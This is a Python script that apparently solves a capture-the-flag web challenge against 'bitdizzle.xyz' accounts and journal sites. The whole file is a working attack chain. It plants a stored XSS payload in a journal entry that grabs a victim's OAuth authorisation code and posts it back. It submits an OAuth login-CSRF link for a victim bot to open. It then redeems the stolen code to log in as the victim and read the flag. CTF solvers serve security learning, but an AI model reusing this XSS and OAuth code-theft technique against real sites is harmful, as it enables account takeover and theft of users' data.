import json
import re
import requests
import secrets
import time
import urllib

ACCOUNTS_SITE = 'https://accounts.bitdizzle.xyz'
JOURNAL_SITE = 'https://journal.bitdizzle.xyz'
ACCOUNTS_COOKIE = '__Host-session'
JOURNAL_COOKIE = '__Host-session'


def main():
    sess = requests.Session()
    
    print('Logging into accounts.bitdizzle with a random user')
    username = secrets.token_urlsafe()
    accounts_session = sess.post(
        ACCOUNTS_SITE + '/login',
        data={
            'username': username,
        },
        allow_redirects=False,
        timeout=1,
    ).cookies[ACCOUNTS_COOKIE]

    print('Checking the journal OAuth client_id')
    client_id = re.search(
        r'client_id=([^&]+)',
        sess.get(
            ACCOUNTS_SITE + '/',
            cookies={ACCOUNTS_COOKIE: accounts_session},
        ).text
    ).group(1)

    print('Getting some OAuth codes for my account')
    codes = []
    for _ in range(2):
        oauth_redirect_response = sess.get(
            ACCOUNTS_SITE + '/oauth_authorize',
            cookies={ACCOUNTS_COOKIE: accounts_session},
            params={
                'client_id': client_id,
                'redirect_uri': 'https://journal.bitdizzle.xyz/oauth_callback',
            },
            allow_redirects=False,
            timeout=1,
        )
        redirect = oauth_redirect_response.headers['Location']
        code = urllib.parse.parse_qs(urllib.parse.urlparse(redirect).query)['code'][0]
        codes.append(code)

    print('Logging into the Journal via OAuth')
    journal_session = sess.get(
        JOURNAL_SITE + '/oauth_callback',
        params={'code': codes.pop()},
        allow_redirects=False,
        timeout=1,
    ).cookies[JOURNAL_COOKIE]

    print('Creating XSS post')
    sess.post(
        'https://journal.bitdizzle.xyz/entries/',
        json={
            'title': '',
            'body': "</script><script>if (window.location.search.indexOf('code') !== -1) fetch('/entries/', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({title: 'stolen code', body: window.location.search})}); else window.location = 'https://accounts.bitdizzle.xyz/oauth_authorize?client_id=" + client_id + "&redirect_uri=https://journal.bitdizzle.xyz/'; //"
        },
    )

    print('Submitting OAuth CSRF link')
    csrf_url = 'https://journal.bitdizzle.xyz/oauth_callback?code=' + codes.pop()
    sess.post(
        'https://accounts.bitdizzle.xyz/submit_link',
        data={
            'link': csrf_url,
        },
        allow_redirects=False,
        timeout=1,
    )

    for _ in range(10):
        print('Waiting 5 seconds for victim to visit link...')
        time.sleep(5)

        initial_props = parse_initial_props(sess.get(
            JOURNAL_SITE + '/',
            cookies={JOURNAL_COOKIE: journal_session},
            allow_redirects=False,
            timeout=1,
        ).text)
        stolen_code_found = False
        for journal_entry in initial_props['entries']:
            if journal_entry['title'] == 'stolen code':
                stolen_code_found = True
                stolen_code = re.search(r'code=([^&]+)', journal_entry['body']).group(1)

                victim_journal = sess.get(
                    JOURNAL_SITE + '/oauth_callback?code=' + stolen_code,
                    allow_redirects=True,
                    timeout=1,
                ).text
                try:
                    victim_initial_props = parse_initial_props(victim_journal)
                except:
                    continue
                for victim_entry in victim_initial_props['entries']:
                    if re.search(r'ASV\{(.+)\}', victim_entry['body']) is not None:
                        print(victim_entry['body'])
                        return
        if stolen_code_found:
            print('Victim visited CSRF link, but I still didn\'t get the flag :(')
            return



def parse_initial_props(html):
    return json.loads(
        re.search(r'window\.initialProps = (.+);<\/script>', html).group(1)
    )



if __name__ == '__main__':
    main()
